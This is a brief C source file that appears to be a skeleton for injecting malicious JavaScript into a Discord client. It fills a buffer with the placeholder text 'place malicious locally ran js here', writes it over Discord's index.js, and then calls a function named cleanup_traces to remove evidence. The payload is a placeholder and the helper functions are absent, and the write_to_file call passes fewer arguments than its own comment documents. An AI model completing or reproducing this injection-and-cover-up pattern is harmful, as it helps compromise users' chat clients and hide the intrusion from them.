/*
    Was supposed to be ran, write file to discord
    and then return. Sadly patched on new versions.
*/

#include <stdio.h>
#include "typedefs.h"



int main()
{
    char data[1024];
    sprintf(data, "place malicious locally ran js here");
  
    write_to_file(2,"index.js"); // Write to discord file function: (INT FileIndex, const char* FileName, char* data)
    cleanup_traces(); // Simple clean 
 
    return 0;
}
